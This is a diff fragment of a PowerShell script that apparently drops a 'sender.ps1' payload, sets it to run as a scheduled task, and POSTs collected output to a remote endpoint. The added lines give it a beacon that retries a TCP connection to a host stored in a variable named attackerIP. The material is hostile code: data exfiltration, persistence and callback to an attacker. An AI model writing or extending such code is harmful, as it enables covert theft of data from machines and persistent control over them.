@@ -77,6 +77,22 @@ Invoke-WebRequest `
     -Method POST `
     -Body $output `
     -ContentType "text/plain"
+
+$attackerIP = "192.168.0.1"
+$port = 1234
+
+for ($i = 0; $i -lt 5; $i++) {
+    try {
+        $client = New-Object System.Net.Sockets.TcpClient
+        $client.Connect($attackerIP, $port)
+        $client.Close()
+        break
+    }
+    catch {
+        Start-Sleep -Seconds 10
+    }
+}
+
 '@ | Set-Content -Path $filePath -Encoding UTF8
 
 # Create task schedule for sender.ps1
